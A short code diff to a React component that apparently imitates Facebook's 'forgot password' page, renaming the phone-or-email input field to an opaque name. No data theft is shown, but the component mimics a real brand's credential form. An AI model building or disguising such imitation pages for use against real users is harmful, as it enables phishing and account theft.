@@ -121,7 +121,7 @@ export default function FacebookForgotPasswordPage() {
             <div>
               <input
                 type="text"
-                name="email_or_phone"
+                name="fb_one"
                 value={identifier}
                 onChange={(e) => setIdentifier(e.target.value)}
                 placeholder="Mobile number or email address"
